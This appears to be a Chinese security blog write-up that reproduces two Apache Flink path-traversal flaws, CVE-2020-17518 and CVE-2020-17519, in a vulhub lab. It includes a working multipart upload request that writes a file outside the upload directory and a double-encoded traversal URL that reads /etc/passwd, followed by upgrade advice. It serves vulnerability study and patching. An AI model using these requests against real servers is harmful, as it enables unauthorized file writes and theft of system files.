![1610718297_60019c59706b9a467b815.png!small](https://image.3001.net/images/20210115/1610718297_60019c59706b9a467b815.png!small)

Apache Flink (文件写入漏洞和文件读取漏洞​)CVE-2020-17518&&CVE-2020-17519

## 一、漏洞描述

Apache Flink核心是一个流式的数据流执行引擎，其针对数据流的分布式计算提供了数据分布、数据通信以及容错机制等功能。Flink
1.5.1引入了REST API，但其实现上存在多处缺陷，导致目录遍历。

CVE-2020-17518: 文件写入漏洞

攻击者利用REST API，可以修改HTTP头，将上传的文件写入到本地文件系统上的任意位置（Flink 1.5.1进程能访问到的）。

CVE-2020-17519: 文件读取漏洞

Apache Flink 1.11.0 允许攻击者通过JobManager进程的REST
API读取JobManager本地文件系统上的任何文件（JobManager进程能访问到的） 。

## 二、影响版本

Apache Flink 1.5.1 ~ 1.11.2

## 三、漏洞复现

环境地址：

https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17518

### 1、CVE-2020-17518: 文件写入漏洞

POST/jars/uploadHTTP/1.1Host: IP:8081Accept-Encoding: gzip, deflateAccept:
*/*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88
Safari/537.36Connection: closeContent-Type: multipart/form-data;
boundary=----WebKitFormBoundaryoZ8meKnrrso89R6YContent-Length: 189------WebKitFormBoundaryoZ8meKnrrso89R6YContent-Disposition: form-data;
name="jarfile"; filename="../../../../../../../tmp/sucess"success------WebKitFormBoundaryoZ8meKnrrso89R6Y--
![1610718297_60019c59d7c078470c440.png!small](https://image.3001.net/images/20210115/1610718297_60019c59d7c078470c440.png!small)

访问：文件写入成功

http://ip+port/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fsucess

![1610718298_60019c5a378e0e957d67d.png!small](https://image.3001.net/images/20210115/1610718298_60019c5a378e0e957d67d.png!small)

### 2、CVE-2020-17519: 文件读取漏洞

http://IP:PORT/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd

访问路径获取passwd

![1610718298_60019c5a88a2937198b92.png!small](https://image.3001.net/images/20210115/1610718298_60019c5a88a2937198b92.png!small)

## 四、修复建议

所有用户升级到Flink 1.11.3或1.12.0，下载链接为：

https://flink.apache.org/downloads.html

https://flink.apache.org/downloads.html

## 参考：

https://mp.weixin.qq.com/s/-OFaYj_C_su7rT965qztVg

https://mp.weixin.qq.com/s/DTXc-RiJPwpu7lg_D6R7cg

免责声明：本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![1610718299_60019c5b17b525f77f119.jpg!small](https://image.3001.net/images/20210115/1610718299_60019c5b17b525f77f119.jpg!small)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF主页：https://www.freebuf.com/author/thelostworld?type=article

![1610718299_60019c5b64a2dcf837a5c.png!small](https://image.3001.net/images/20210115/1610718299_60019c5b64a2dcf837a5c.png!small)

欢迎添加本公众号作者微信交流，添加时备注一下“公众号”

![1610718299_60019c5bac8a4846006b8.png!small](https://image.3001.net/images/20210115/1610718299_60019c5bac8a4846006b8.png!small)

  

